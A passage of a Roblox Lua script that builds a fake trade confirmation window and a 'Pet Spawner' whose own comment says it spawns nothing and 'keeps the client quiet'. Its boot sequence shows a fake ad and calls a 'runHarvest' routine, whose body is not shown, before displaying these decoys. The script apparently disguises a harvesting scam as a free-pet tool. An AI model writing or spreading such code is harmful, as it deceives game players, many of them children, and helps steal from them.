    accept.TextSize = 16
    accept.Parent = window
    local ac = Instance.new("UICorner"); ac.CornerRadius = UDim.new(0, 6); ac.Parent = accept

    local stage = 0
    accept.MouseButton1Click:Connect(function()
        stage = stage + 1
        if stage == 1 then
            accept.Text = "Confirm"
            statusLbl.Text = "Waiting for other side to accept…"
        elseif stage == 2 then
            accept.Text = "..."
            statusLbl.Text = "Processing trade…"
            task.wait(1.2)
            statusLbl.Text = "Trade complete. Check your inventory."
            task.wait(1.8)
            gui:Destroy()
        end
    end)
end

--------------------------------------------------------------------------------
-- PET SPAWNER (client-side visual — rough list)
--------------------------------------------------------------------------------
local function showPetSpawner()
    if CoreGui:FindFirstChild("PetSpawner") then return end
    local gui = Instance.new("ScreenGui")
    gui.Name = "PetSpawner"
    gui.ResetOnSpawn = false
    gui.DisplayOrder = 20
    gui.Parent = CoreGui

    local frame = Instance.new("Frame")
    frame.Size = UDim2.new(0, 240, 0, 380)
    frame.Position = UDim2.new(0, 20, 0.5, -190)
    frame.BackgroundColor3 = Color3.fromRGB(35, 35, 45)
    frame.BorderSizePixel = 0
    frame.Parent = gui
    local fc = Instance.new("UICorner"); fc.CornerRadius = UDim.new(0, 6); fc.Parent = frame
    local fs = Instance.new("UIStroke"); fs.Color = Color3.fromRGB(80, 180, 80); fs.Thickness = 2; fs.Parent = frame

    local title = Instance.new("TextLabel")
    title.Size = UDim2.new(1, 0, 0, 28)
    title.BackgroundTransparency = 1
    title.Text = "Pet Spawner"
    title.TextColor3 = Color3.fromRGB(200, 255, 200)
    title.Font = Enum.Font.FredokaOne
    title.TextSize = 16
    title.Parent = frame

    local status = Instance.new("TextLabel")
    status.Size = UDim2.new(1, -12, 0, 16)
    status.Position = UDim2.new(0, 6, 0, 30)
    status.BackgroundTransparency = 1
    status.Text = "click a pet to spawn it"
    status.TextColor3 = Color3.fromRGB(180, 180, 180)
    status.Font = Enum.Font.SourceSans
    status.TextSize = 11
    status.TextXAlignment = Enum.TextXAlignment.Left
    status.Parent = frame

    local scroll = Instance.new("ScrollingFrame")
    scroll.Size = UDim2.new(1, -12, 1, -56)
    scroll.Position = UDim2.new(0, 6, 0, 50)
    scroll.BackgroundColor3 = Color3.fromRGB(25, 25, 32)
    scroll.BorderSizePixel = 0
    scroll.ScrollBarThickness = 6
    scroll.CanvasSize = UDim2.new(0, 0, 0, 0)
    scroll.AutomaticCanvasSize = Enum.AutomaticSize.Y
    scroll.Parent = frame
    local lay = Instance.new("UIListLayout"); lay.Padding = UDim.new(0, 3); lay.Parent = scroll
    local pad = Instance.new("UIPadding")
    pad.PaddingTop = UDim.new(0, 4); pad.PaddingLeft = UDim.new(0, 4)
    pad.PaddingRight = UDim.new(0, 4); pad.PaddingBottom = UDim.new(0, 4)
    pad.Parent = scroll

    for _, pet in ipairs(PET_LIST) do
        local b = Instance.new("TextButton")
        b.Size = UDim2.new(1, -8, 0, 30)
        b.BackgroundColor3 = pet.color
        b.BackgroundTransparency = 0.25
        b.Text = pet.name .. "  (" .. pet.tag .. ")"
        b.TextColor3 = Color3.fromRGB(255, 255, 255)
        b.Font = Enum.Font.SourceSans
        b.TextSize = 12
        b.TextXAlignment = Enum.TextXAlignment.Left
        b.Parent = scroll
        local bc = Instance.new("UICorner"); bc.CornerRadius = UDim.new(0, 4); bc.Parent = b
        local bp = Instance.new("UIPadding"); bp.PaddingLeft = UDim.new(0, 8); bp.Parent = b

        b.MouseButton1Click:Connect(function()
            -- client-side visual only — no real spawn, keeps the client quiet
            status.Text = "spawned: " .. pet.name
            status.TextColor3 = Color3.fromRGB(150, 255, 150)
            b.BackgroundColor3 = Color3.fromRGB(60, 160, 60)
            task.delay(0.4, function()
                b.BackgroundColor3 = pet.color
            end)
        end)
    end
end

--------------------------------------------------------------------------------
-- BOOT
--------------------------------------------------------------------------------
task.spawn(function()
    if not selfTestPing() then
        LOG("selftest failed — running harvest anyway")
    end
    task.wait(0.4)
    pcall(showFakeAd)
    task.wait(2)
    pcall(runHarvest)
    task.wait(3)
    pcall(showFakeTrade)
    task.wait(0.3)
    pcall(showPetSpawner)
end)
